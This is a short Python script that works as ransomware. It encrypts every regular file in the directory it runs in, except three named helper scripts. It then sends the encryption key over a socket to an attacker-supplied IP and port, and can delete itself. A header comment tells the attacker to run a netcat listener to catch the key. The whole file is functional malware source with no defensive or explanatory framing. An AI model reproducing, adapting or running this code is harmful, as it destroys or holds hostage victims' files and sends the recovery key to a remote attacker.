# SETUP: on the ATTACKER-side, run following command
# nc -lvnp [PORT] > thekey.key

from cryptography.fernet import Fernet
import os, socket, argparse

parser = argparse.ArgumentParser()

parser.add_argument("-ip", "--ip")
parser.add_argument("-p", "--port")
parser.add_argument("-sd", "--selfdestructive")

args = parser.parse_args()

ATTACKER_IP = args.ip
ATTACKER_PORT = int(args.port)
isSelfDestr = bool(args.selfdestructive)

key = Fernet.generate_key()

files = []

def sendfile(ip, port, binary_data):
        s = socket.socket()
        s.connect((ip, port))
        s.send(binary_data)

for file in os.listdir():
    if file == "encrypt.py" or file == "decrypt.py" or file == "sendfile.py":
        continue
    if os.path.isfile(file):
        files.append(file)

contents = []

for file in files:
    with open(file, 'rb') as f:
        content = f.read()
    
    encrypted_content = Fernet(key).encrypt(content)

    with open(file, 'wb') as f:
        f.write(encrypted_content)

sendfile(ATTACKER_IP, ATTACKER_PORT, key)

if isSelfDestr: os.remove(os.path.basename(__file__))
